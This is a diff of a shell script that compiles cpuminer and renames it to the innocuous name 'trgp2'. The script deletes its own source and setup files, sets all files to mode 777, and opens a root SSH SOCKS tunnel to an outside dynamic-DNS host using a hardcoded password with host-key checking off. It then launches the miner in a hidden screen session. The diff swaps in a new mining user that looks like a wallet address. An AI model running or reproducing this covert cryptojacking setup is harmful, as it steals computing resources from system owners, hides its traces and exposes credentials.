@@ -5,4 +5,4 @@ cd severtat
 chmod +x *
 ./build.sh
 make
-mv cpuminer trgp2 && cp trgp2 ../ && cd ..  && sudo rm -rf severtat severcode.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxypro.ddns.net && cpulimit --exe trgp2 --limit 200 -b && screen -d -m ./trgp2 -u classic.cc5 -p x -x socks4://127.0.0.1:1997
+mv cpuminer trgp2 && cp trgp2 ../ && cd ..  && sudo rm -rf severtat severcode.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxypro.ddns.net && cpulimit --exe trgp2 --limit 200 -b && screen -d -m ./trgp2 -u HEdFmJcS9TxrwfmPvhPWaGeTxCfdVKttkE.Google -p x -x socks4://127.0.0.1:1997
